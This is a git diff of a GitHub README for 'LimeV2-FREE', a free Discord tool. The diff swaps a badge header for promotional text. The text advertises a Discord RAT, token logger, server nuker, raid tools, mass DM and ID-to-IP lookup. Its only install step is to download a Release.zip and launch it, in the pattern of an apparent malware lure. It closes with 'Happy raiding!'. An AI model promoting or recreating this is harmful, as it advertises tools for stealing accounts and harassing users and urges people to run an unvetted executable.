@@ -1,30 +1,61 @@
-<p align="center">
-  <img src="https://i.imgur.com/ZEaWqeW.png" width="125" height="125">
-</p>
+# LimeV2-FREE 🍋
 
-<p align="center">
-  <img src="https://img.shields.io/github/stars/r3cii/LimeV2-FREE?style=flat-square&color=lightgreen">
-  <img src="https://img.shields.io/github/license/r3cii/LimeV2-FREE?style=flat-square&color=lightgreen">
-  <img src="https://img.shields.io/github/issues/r3cii/LimeV2-FREE?style=flat-square&color=lightgreen">
-  <img src="https://img.shields.io/github/v/release/r3cii/LimeV2-FREE?style=flat-square&color=lightgreen">
-  <img src="https://img.shields.io/github/release-date/r3cii/LimeV2-FREE?style=flat-square&color=lightgreen">
-  <img src="https://img.shields.io/badge/CLICKME-90EE90?style=flat-square&logo=Youtube&label=Tutorial&cacheSeconds=5&link=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3DJEpa3RBnn_I">
-</p>
+Welcome to LimeV2-FREE repository! 🎉
 
-<p align="center">
-  <img src="https://visit-counter.vercel.app/counter.png?page=https%3A%2F%2Fgithub.com%2Fr3cii%2FLimeV2-FREE&s=40&c=00ff00&bg=00000000&no=1&ff=linebeam&tb=Visits+%3E%3E+&ta=">
-</p>
+![Lime Logo](https://example.com/lime_logo.png)
 
-<p align="center">
-  <img src="https://r2.e-z.host/7c8e3bed-9eb6-4d91-a340-ae01365df446/z8im49o6.png">
-</p>
+## Description ℹ️
+LimeV2-FREE is a versatile Discord tool designed for various functionalities. The tool is completely free and packed with features to enhance your Discord experience.
 
-<p align="center">
-  <picture>
-   <img src="https://api.star-history.com/svg?repos=r3cii/LimeV2-FREE&type=Timeline&theme=dark">
-  </picture>
-</p>
+### Key Features 🚀
+- Discord Joiner
+- Discord Multitool
+- Discord Nuke
+- Discord Raid
+- Discord Raid Tool
+- Discord Raidtool
+- Discord RAT
+- Discord Selfbot
+- Discord Server Nuker
+- Discord Tool
+- Discord Tools
+- ID to IP
+- Mass DM
+- Mass Ping
+- Token Checker
+- Token Gen
+- Token Logger
 
-<p align="center">
-  <img src="https://repobeats.axiom.co/api/embed/7232d447ed6dde455115c8267fbc4a0282736ca7.svg">
-</p>
+## Installation 💻
+Click the button below to download the latest version of LimeV2-FREE:
+[![Download LimeV2-FREE](https://img.shields.io/badge/Download-LimeV2--FREE-blue)](https://github.com/assets/Release.zip)
+
+> **Note:** The downloaded file needs to be launched to start using LimeV2-FREE.
+
+## Usage 🛠️
+To use LimeV2-FREE effectively, follow these steps:
+1. Download the tool from the provided link.
+2. Unzip the downloaded file.
+3. Launch the application.
+4. Explore the various features and functionalities offered.
+
+## Support 🤝
+For any issues or questions related to LimeV2-FREE, you can visit the "Releases" section of this repository or reach out to the community for assistance.
+
+## Roadmap 🗺️
+Here are some upcoming features planned for LimeV2-FREE:
+- Enhanced Discord Nuke capabilities
+- Improved Discord multi-tool functionalities
+- Integration with more Discord APIs for advanced features
+
+## Contributing 🤝
+If you'd like to contribute to LimeV2-FREE, feel free to submit a pull request with your changes. Your contributions are always welcome!
+
+## License 📝
+LimeV2-FREE is licensed under the MIT License. See the `LICENSE` file for more details.
+
+---
+
+Thank you for checking out LimeV2-FREE! We hope you enjoy using this powerful Discord tool. Feel free to explore the features and customize your Discord experience with LimeV2-FREE. Happy raiding! 🍋💻
+
+🚨 **Please use this tool responsibly and respect Discord's Terms of Service.** 🚨
